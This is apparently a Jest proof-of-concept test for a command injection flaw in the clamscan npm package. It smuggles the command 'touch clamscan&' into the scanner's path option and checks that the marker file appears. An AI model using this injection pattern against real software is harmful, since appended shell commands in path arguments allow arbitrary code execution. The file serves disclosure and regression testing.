test("Command Injection in clamscan", () => {
  expect.assertions(2);
  const Root = require("clamscan");
  const fs = require("fs");
  const path = "./clamscan";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var attack_code = "touch clamscan";
  var root = new Root();
  fs.mkdir(attack_code + "&", function () {});
  return root
    .init({ clamscan: { path: attack_code + "&" } })
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
